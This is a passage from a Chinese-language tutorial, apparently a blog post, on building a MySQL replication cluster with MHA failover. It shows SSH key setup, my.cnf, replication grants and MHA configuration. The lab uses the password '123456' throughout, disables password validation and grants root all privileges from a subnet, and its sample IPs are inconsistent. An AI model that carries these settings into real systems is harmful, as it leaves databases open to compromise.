http://mirror.centos.org/centos/7/os/x86_64/Packages/perl-Config-Tiny-2.14-7.el7.noarch.rpm</code></pre><p>MHA Manager&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5728;/usr/bin&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x751F;&#x6210;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x91CD;&#x590D;</p><pre><code class="shell">[root@ctos7mini mysql_master_ha]&amp;ll /usr/bin/mast*-rwxr-xr-x. 1 root root 1995 Dec  1  2012 /usr/bin/masterha_check_repl-rwxr-xr-x. 1 root root 1779 Dec  1  2012 /usr/bin/masterha_check_ssh-rwxr-xr-x. 1 root root 1865 Dec  1  2012 /usr/bin/masterha_check_status-rwxr-xr-x. 1 root root 3201 Dec  1  2012 /usr/bin/masterha_conf_host-rwxr-xr-x. 1 root root 2517 Dec  1  2012 /usr/bin/masterha_manager-rwxr-xr-x. 1 root root 2165 Dec  1  2012 /usr/bin/masterha_master_monitor-rwxr-xr-x. 1 root root 2373 Dec  1  2012 /usr/bin/masterha_master_switch-rwxr-xr-x. 1 root root 3879 Dec  1  2012 /usr/bin/masterha_secondary_check-rwxr-xr-x. 1 root root 1739 Dec  1  2012 /usr/bin/masterha_stop[root@ctos7mini mysql_master_ha]&amp; </code></pre><p><strong>&#xFF08;4&#xFF09;&#x914D;&#x7F6E;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x76F8;&#x4E92;SSH&#x767B;&#x5F55;&#x65E0;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#xFF08;&#x4F7F;&#x7528;key&#x767B;&#x5F55;&#xFF0C;&#x5DE5;&#x4F5C;&#x4E2D;&#x5E38;&#x7528;&#xFF09;</strong><br>&#x6709;&#x4E00;&#x70B9;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x80FD;&#x7981;&#x6B62; password &#x767B;&#x9646;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF;</p><p>&#x5728;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x4E0A;&#x914D;&#x7F6E;ssh&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#xFF1A;</p><pre><code class="mbox">[root@rhel7 ~]# ssh-keygen -t rsaGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): &#x56DE;&#x8F66;Enter passphrase (empty for no passphrase): &#x56DE;&#x8F66;Enter same passphrase again: &#x56DE;&#x8F66;Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:c2:95:fa:7e:f5:ef:07:3f:70:a2:ec:bb:3a:5a:9f:d9 root@rhel7The key&apos;s randomart image is:+--[ RSA 2048]----+|                 ||         .       ||        o        ||     . o         ||      + S        ||       o    .o.. ||        ......+o ||       ...oo+ ..o||       .oo+BoE o=|+-----------------+[root@rhel7 ~]#</code></pre><pre><code class="shell">[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.20[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.22[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.23</code></pre><p>&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x91CD;&#x590D;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C;</p><p><strong>ssh&#x914D;&#x7F6E;&#x6269;&#x5C55;</strong></p><blockquote><p>&#x89E3;&#x51B3;rhel&#x8FDE;&#x63A5;ssh&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x8FC7;&#x4E45;&#x7684;&#x95EE;&#x9898;</p></blockquote><pre><code class="shell">[root@rhel7 ~]&amp; vim /etc/ssh/sshd_config# &#x53BB;&#x6389;&#x6CE8;&#x91CA;&#xFF0C;&#x6539;&#x4E3A;noUseDNS no</code></pre><h2 id="2-&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;"><a href="#2-&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;" class="headerlink" title="2. &#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;"></a>2. &#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;</h2><p>&#x6CE8;&#x610F;&#xFF1A;binlog-do-db &#x548C; replicate-ignore-db &#x8BBE;&#x7F6E;&#x5FC5;&#x987B;&#x76F8;&#x540C;&#xFF1B;MHA &#x5728;&#x542F;&#x52A8;&#x65F6;&#x5019;&#x4F1A;&#x68C0;&#x6D4B;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x4E0D;&#x540C;&#xFF0C;MHA &#x4E0D;&#x542F;&#x52A8;&#x76D1;&#x63A7;&#x548C;&#x6545;&#x969C;&#x8F6C;&#x79FB;</p><h3 id="&#x5728;192-168-73-21&#x4E0A;&#x914D;&#x7F6E;MySQL-master"><a href="#&#x5728;192-168-73-21&#x4E0A;&#x914D;&#x7F6E;MySQL-master" class="headerlink" title="&#x5728;192.168.73.21&#x4E0A;&#x914D;&#x7F6E;MySQL master"></a>&#x5728;192.168.73.21&#x4E0A;&#x914D;&#x7F6E;MySQL master</h3><p><strong>&#x521B;&#x5EFA;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;</strong></p><pre><code class="sql">mysql -uroot -p123456mysql&gt; CREATE DATABASE ha DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;mysql&gt; use HA;mysql&gt; CREATE TABLE test(id int,name varchar(20));</code></pre><p><strong>&#x914D;&#x7F6E;<code>my.cnf</code>&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;</strong></p><pre><code class="ini"># &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;bind-address    = 0.0.0.0# &#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;log-bin=mysql-bin-master# &#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID&#x6807;&#x8BC6;server-id=1# &#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;binlog-do-db=ha# &#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;binlog-ignore-db=mysql# [&#x53EF;&#x9009;]&#x81EA;MySQL5.6&#x7248;&#x672C;&#xFF0C;&#x5F15;&#x5165;&#x4E86;&#x65B0;&#x5BC6;&#x7801;&#x6821;&#x9A8C;&#x63D2;&#x4EF6;validate_password, &#x7528;&#x4E8E;&#x7BA1;&#x7406;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x957F;&#x5EA6;&#x3001;&#x5F3A;&#x5EA6;&#x7B49;&#xFF0C;&#x4FDD;&#x969C;&#x8D26;&#x53F7;&#x7684;&#x5B89;&#x5168;&#x6027;validate-password=off </code></pre><p>&#x6587;&#x6863;&#xFF1A;&#x5B89;&#x88C5;validate_password&#x63D2;&#x4EF6;.md<br><a href="http://note.youdao.com/noteshare?id=3808ed864a33805181a8cbea885a6784&amp;sub=02140C7F57F9404499D06E2EF7006296" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=3808ed864a33805181a8cbea885a6784&amp;sub=02140C7F57F9404499D06E2EF7006296</a></p><p>&#x91CD;&#x542F;MySQL</p><p><strong>&#x6388;&#x6743;</strong></p><pre><code class="sql">mysql&gt; grant replication slave on *.* to slave@&apos;192.168.73.%&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x72B6;&#x6001;&#x4FE1;&#x606F;</p><pre><code class="sql">mysql&gt; show master status;+-------------------------+----------+--------------+------------------+-------------------+| File                    | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------------+----------+--------------+------------------+-------------------+| mysql-bin-master.000001 |      154 | ha           | mysql            |                   |+-------------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt;</code></pre><h3 id="&#x5728;192-168-73-22&#x4E0A;&#x914D;&#x7F6E;MySQL-slave"><a href="#&#x5728;192-168-73-22&#x4E0A;&#x914D;&#x7F6E;MySQL-slave" class="headerlink" title="&#x5728;192.168.73.22&#x4E0A;&#x914D;&#x7F6E;MySQL slave"></a>&#x5728;192.168.73.22&#x4E0A;&#x914D;&#x7F6E;MySQL slave</h3><p><strong>&#x914D;&#x7F6E;<code>my.cnf</code>&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;</strong></p><pre><code class="ini">bind-address    = 0.0.0.0log-bin=mysql-slave1server-id=2binlog-do-db=habinlog-ignore-db=mysql#&#x53EA;&#x6709;&#x5F00;&#x542F;log_slave_updates&#xFF0C;&#x4ECE;&#x5E93;binlog&#x624D;&#x4F1A;&#x8BB0;&#x5F55;&#x4E3B;&#x5E93;&#x540C;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;log_slave_updates=1</code></pre><p>&#x91CD;&#x542F;MySQL</p><p><strong>&#x6388;&#x6743;&#x5E76;&#x5EFA;&#x7ACB;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;</strong></p><pre><code class="sql">mysql&gt; grant replication slave on *.* to slave@&apos;192.168.73.%&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; change master to master_host=&apos;192.168.73.21&apos;,master_user=&apos;slave&apos;,master_password=&apos;123456&apos;;Query OK, 0 rows affected, 2 warnings (0.01 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; show master status;+---------------------+----------+--------------+------------------+-------------------+| File                | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+---------------------+----------+--------------+------------------+-------------------+| mysql-slave1.000002 |      154 | ha           | mysql            |                   |+---------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.73.21                  Master_User: slave                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin-master.000002          Read_Master_Log_Pos: 154               Relay_Log_File: ctos_sqlsrv-relay-bin.000011                Relay_Log_Pos: 381        Relay_Master_Log_File: mysql-bin-master.000002             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:.................................................&#x7701;&#x7565;.......................................................                  Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates           Master_Retry_Count: 86400.................................................&#x7701;&#x7565;........................................................1 row in set (0.00 sec)mysql&gt;</code></pre><h3 id="&#x5728;192-168-73-23&#x4E0A;&#x914D;&#x7F6E;MySQL-slave"><a href="#&#x5728;192-168-73-23&#x4E0A;&#x914D;&#x7F6E;MySQL-slave" class="headerlink" title="&#x5728;192.168.73.23&#x4E0A;&#x914D;&#x7F6E;MySQL slave"></a>&#x5728;192.168.73.23&#x4E0A;&#x914D;&#x7F6E;MySQL slave</h3><p><strong>&#x914D;&#x7F6E;<code>my.cnf</code>&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;</strong></p><pre><code class="ini">bind-address    = 0.0.0.0log-bin=mysql-slave2server-id=3binlog-do-db=habinlog-ignore-db=mysqllog_slave_updates=1</code></pre><p>&#x91CD;&#x542F;MySQL</p><p><strong>&#x6388;&#x6743;&#x5E76;&#x5EFA;&#x7ACB;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;</strong></p><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)mysql&gt; show master status;+---------------------+----------+--------------+------------------+-------------------+| File                | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+---------------------+----------+--------------+------------------+-------------------+| mysql-slave2.000002 |      601 | ha           | mysql            |                   |+---------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; change master to master_host=&apos;192.168.73.21&apos;,master_user=&apos;slave&apos;,master_password=&apos;123456&apos;;Query OK, 0 rows affected, 2 warnings (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.73.21                  Master_User: slave                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin-master.000002          Read_Master_Log_Pos: 154               Relay_Log_File: rhel_sqlsrv-relay-bin.000003                Relay_Log_Pos: 381        Relay_Master_Log_File: mysql-bin-master.000002             Slave_IO_Running: Yes            Slave_SQL_Running: Yes.................................................&#x7701;&#x7565;.......................................................             Master_Server_Id: 1                  Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates           Master_Retry_Count: 86400.................................................&#x7701;&#x7565;.......................................................1 row in set (0.00 sec)mysql&gt;</code></pre><p><strong>&#x4E24;&#x53F0;slave&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;read_only&#xFF08;&#x4ECE;&#x5E93;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;&#x53EA;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x5199;&#x8FDB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;slave&#x968F;&#x65F6;&#x4F1A;&#x63D0;&#x5347;&#x4E3A;master&#xFF09;</strong></p><pre><code class="sql">mysql&gt; set global read_only=1;Query OK, 0 rows affected (0.00 sec)mysql&gt;</code></pre><p><strong>&#x521B;&#x5EFA;&#x76D1;&#x63A7;&#x7528;&#x6237;&#xFF08;&#x5728;&#x4E3B;&#x4ECE;&#x4E0A;&#x90FD;&#x6267;&#x884C;&#xFF09;&#xFF1A;</strong></p><pre><code class="sql">grant all privileges on *.* to &apos;root&apos;@&apos;192.168.10.%&apos; identified  by &apos;123456&apos;;flush privileges;</code></pre><p>&#x5230;&#x8FD9;&#x91CC;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x73AF;&#x5883;&#x5DF2;&#x7ECF;&#x642D;&#x5EFA;&#x5B8C;&#x6BD5;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x914D;&#x7F6E;MHA&#x8F6F;&#x4EF6;&#x4E86;</p><h2 id="3-&#x914D;&#x7F6E;MHA"><a href="#3-&#x914D;&#x7F6E;MHA" class="headerlink" title="3. &#x914D;&#x7F6E;MHA"></a>3. &#x914D;&#x7F6E;MHA</h2><p><strong>&#xFF08;1&#xFF09;&#x521B;&#x5EFA;MHA&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x521B;&#x5EFA;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x5728;&#x8F6F;&#x4EF6;&#x5305;&#x89E3;&#x538B;&#x540E;&#x7684;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x6709;&#x6837;&#x4F8B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;</strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; mkdir -p /etc/masterha[root@ctos7mini ~]&amp; mkdir -p /var/log/masterha/app1[root@ctos7mini ~]&amp; vim /etc/masterha/app1.cnf</code></pre><p>&#x4FEE;&#x6539;app1.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6CE8;&#x91CA;&#x9700;&#x8981;&#x53BB;&#x6389;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x91CA;&#x6E05;&#x695A;&#xFF09;&#xFF1A;</p><p><strong>&#x53C2;&#x6570;&#x8BF4;&#x660E;</strong></p><pre><code class="c">[server default]manager_workdir=/var/log/masterha/app1            //&#x8BBE;&#x7F6E;manager&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;manager_log=/var/log/masterha/app1/manager.log          //&#x8BBE;&#x7F6E;manager&#x7684;&#x65E5;&#x5FD7;master_binlog_dir=/data/mysql                         //&#x8BBE;&#x7F6E;master &#x4FDD;&#x5B58;binlog&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x4FBF;MHA&#x53EF;&#x4EE5;&#x627E;&#x5230;master&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x7684;&#x4E5F;&#x5C31;&#x662F;mysql&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;master_ip_failover_script= /usr/local/bin/master_ip_failover    //&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;failover&#x65F6;&#x5019;&#x7684;&#x5207;&#x6362;&#x811A;&#x672C;master_ip_online_change_script= /usr/local/bin/master_ip_online_change  //&#x8BBE;&#x7F6E;&#x624B;&#x52A8;&#x5207;&#x6362;&#x65F6;&#x5019;&#x7684;&#x5207;&#x6362;&#x811A;&#x672C;password=123456         //&#x8BBE;&#x7F6E;mysql&#x4E2D;root&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BC6;&#x7801;&#x662F;&#x524D;&#x6587;&#x4E2D;&#x521B;&#x5EFA;&#x76D1;&#x63A7;&#x7528;&#x6237;&#x7684;&#x90A3;&#x4E2A;&#x5BC6;&#x7801;user=root               &#x8BBE;&#x7F6E;&#x76D1;&#x63A7;&#x7528;&#x6237;rootping_interval=1         //&#x8BBE;&#x7F6E;&#x76D1;&#x63A7;&#x4E3B;&#x5E93;&#xFF0C;&#x53D1;&#x9001;ping&#x5305;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;3&#x79D2;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E09;&#x6B21;&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x7684;&#x65F6;&#x5019;&#x81EA;&#x52A8;&#x8FDB;&#x884C;railoverremote_workdir=/tmp     //&#x8BBE;&#x7F6E;&#x8FDC;&#x7AEF;mysql&#x5728;&#x53D1;&#x751F;&#x5207;&#x6362;&#x65F6;binlog&#x7684;&#x4FDD;&#x5B58;&#x4F4D;&#x7F6E;repl_password=123456    //&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;repl_user=repl          //&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x590D;&#x5236;&#x7528;&#x6237;&#x540D;report_script=/usr/local/send_report    //&#x8BBE;&#x7F6E;&#x53D1;&#x751F;&#x5207;&#x6362;&#x540E;&#x53D1;&#x9001;&#x7684;&#x62A5;&#x8B66;&#x7684;&#x811A;&#x672C;shutdown_script=&quot;&quot;      //&#x8BBE;&#x7F6E;&#x6545;&#x969C;&#x53D1;&#x751F;&#x540E;&#x5173;&#x95ED;&#x6545;&#x969C;&#x4E3B;&#x673A;&#x811A;&#x672C;&#xFF08;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x662F;&#x5173;&#x95ED;&#x4E3B;&#x673A;&#x653E;&#x5728;&#x53D1;&#x751F;&#x8111;&#x88C2;,&#x8FD9;&#x91CC;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#xFF09;ssh_user=root           //&#x8BBE;&#x7F6E;ssh&#x7684;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;[server1]hostname=192.168.10.12port=3306[server2]hostname=192.168.10.13port=3306candidate_master=1   #&#x8BBE;&#x7F6E;&#x4E3A;&#x5019;&#x9009;master&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#x4EE5;&#x540E;&#xFF0C;&#x53D1;&#x751F;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x4EE5;&#x540E;&#x5C06;&#x4F1A;&#x5C06;&#x6B64;&#x4ECE;&#x5E93;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#xFF0C;&#x5373;&#x4F7F;&#x8FD9;&#x4E2A;&#x4E3B;&#x5E93;&#x4E0D;&#x662F;&#x96C6;&#x7FA4;&#x4E2D;&#x4E8B;&#x4EF6;&#x6700;&#x65B0;&#x7684;slavecheck_repl_delay=0   #&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x5982;&#x679C;&#x4E00;&#x4E2A;slave&#x843D;&#x540E;master 100M&#x7684;relay logs&#x7684;&#x8BDD;&#xFF0C;MHA&#x5C06;&#x4E0D;&#x4F1A;&#x9009;&#x62E9;&#x8BE5;slave&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x65B0;&#x7684;master&#xFF0C;&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;slave&#x7684;&#x6062;&#x590D;&#x9700;&#x8981;&#x82B1;&#x8D39;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#xFF0C;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;check_repl_delay=0,MHA&#x89E6;&#x53D1;&#x5207;&#x6362;&#x5728;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B0;&#x7684;master&#x7684;&#x65F6;&#x5019;&#x5C06;&#x4F1A;&#x5FFD;&#x7565;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5BF9;&#x4E8E;&#x8BBE;&#x7F6E;&#x4E86;candidate_master=1&#x7684;&#x4E3B;&#x673A;&#x975E;&#x5E38;&#x6709;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x5019;&#x9009;&#x4E3B;&#x5728;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E00;&#x5B9A;&#x662F;&#x65B0;&#x7684;master[server3]hostname=192.168.10.14port=3306</code></pre><p><strong>&#x53C2;&#x8003;&#x914D;&#x7F6E;&#xFF1A;</strong></p><pre><code class="ini">[server default]manager_workdir=/var/log/masterha/app1manager_log=/var/log/masterha/app1/manager.logmaster_binlog_dir=/var/lib/mysqlmaster_ip_failover_script= /usr/local/bin/master_ip_failovermaster_ip_online_change_script= /usr/local/bin/master_ip_online_change password=123456user=rootping_interval=1remote_workdir=/tmprepl_password=123456repl_user=slave#report_script=/usr/local/send_reportshutdown_script=&quot;&quot;ssh_user=root[server1]hostname=192.168.73.21port=3306[server2]hostname=192.168.73.22port=3306candidate_master=1check_repl_delay=0[server3]hostname=192.168.73.23port=3306</code></pre><p><strong>&#xFF08;2&#xFF09;&#x8BBE;&#x7F6E;relay log&#x7684;&#x6E05;&#x9664;&#x65B9;&#x5F0F;&#xFF08;&#x5728;&#x6BCF;&#x4E2A;slave&#x8282;&#x70B9;&#x4E0A;&#xFF09;&#xFF1A;</strong></p><pre><code class="sql">mysql&gt; set global relay_log_purge=0;Query OK, 0 rows affected (0.00 sec)mysql&gt;</code></pre><p><span style="color:red">&#x6CE8;&#x610F;&#xFF1A;</span><br>MHA&#x5728;&#x53D1;&#x751F;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4ECE;&#x5E93;&#x7684;&#x6062;&#x590D;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F9D;&#x8D56;&#x4E8E;relay log&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x8981;&#x5C06;relay log&#x7684;&#x81EA;&#x52A8;&#x6E05;&#x9664;&#x8BBE;&#x7F6E;&#x4E3A;OFF&#xFF0C;&#x91C7;&#x7528;&#x624B;&#x52A8;&#x6E05;&#x695A;relay log&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;slave&#x4E0A;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x4F1A;&#x5728;SQL&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#x88AB;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x3002;<strong>&#x4F46;&#x662F;&#x5728;MHA&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x5728;&#x6062;&#x590D;&#x5176;&#x5B83;slave&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x7528;&#x5230;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x7981;&#x7528;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x7684;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x529F;&#x80FD;&#x3002;</strong>&#x5B9A;&#x671F;&#x6E05;&#x695A;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x9700;&#x8981;&#x8003;&#x8651;&#x5230;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5728;ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x5220;&#x9664;&#x5927;&#x7684;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x4E25;&#x91CD;&#x7684;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x3002;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6682;&#x65F6;&#x4E3A;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x521B;&#x5EFA;&#x786C;&#x94FE;&#x63A5;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x901A;&#x8FC7;&#x786C;&#x94FE;&#x63A5;&#x5220;&#x9664;&#x5927;&#x6587;&#x4EF6;&#x901F;&#x5EA6;&#x4F1A;&#x5F88;&#x5FEB;&#x3002;&#xFF08;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x5220;&#x9664;&#x5927;&#x8868;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x4E5F;&#x91C7;&#x7528;&#x5EFA;&#x7ACB;&#x786C;&#x94FE;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#xFF09;</p><p><strong>&#xFF08;3&#xFF09;.&#x68C0;&#x67E5;SSH&#x914D;&#x7F6E;</strong></p><p>&#x68C0;&#x67E5;MHA Manger&#x5230;&#x6240;&#x6709;MHA Node&#x7684;SSH&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#xFF1A;</p><pre><code class="mbox">[root@ctos7mini ~]&amp; masterha_check_ssh --conf=/etc/masterha/app1.cnfFri May  6 22:31:51 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May  6 22:31:51 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May  6 22:31:51 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May  6 22:31:51 2022 - [info] Starting SSH connection tests..Fri May  6 22:31:54 2022 - [debug]Fri May  6 22:31:51 2022 - [debug]  Connecting via SSH from root@192.168.73.21(192.168.73.21:22) to root@192.168.73.22(192.168.73.22:22)..Fri May  6 22:31:52 2022 - [debug]   ok.Fri May  6 22:31:52 2022 - [debug]  Connecting via SSH from 